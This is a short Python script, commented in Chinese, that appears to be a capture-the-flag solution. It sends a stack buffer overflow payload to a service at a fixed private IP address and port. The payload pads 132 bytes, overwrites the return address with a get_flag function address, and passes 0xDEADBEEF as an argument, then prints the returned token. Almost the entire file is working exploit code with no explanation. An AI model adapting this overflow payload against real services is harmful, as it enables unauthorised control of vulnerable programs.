import socket
import struct
import ctypes

# 获取token的服务器地址，固定
TARGET_HOST = "172.17.84.102"
TARGET_PORT = 9999

GET_FLAG = 0x00401000 # get_flag函数地址
OFFSET = 132 # 栈偏移
param1 = ctypes.c_uint32(-0x21524111).value  # 将负数转换为无符号整数0xDEADBEEF

def get_token():
    payload = b"A" * OFFSET
    payload += struct.pack("<I", GET_FLAG)
    payload += struct.pack("<I", GET_FLAG) # 填充假返回地址，内容不限
    payload += struct.pack("<I", param1)
    payload += b"\n"

    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10) as sock:
        sock.settimeout(5)

        banner = sock.recv(1024)
        print(banner.decode(errors="replace"), end="")

        sock.sendall(payload)

        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break

    text = response.decode(errors="replace")
    print(text)

    return text

if __name__ == "__main__":
    get_token()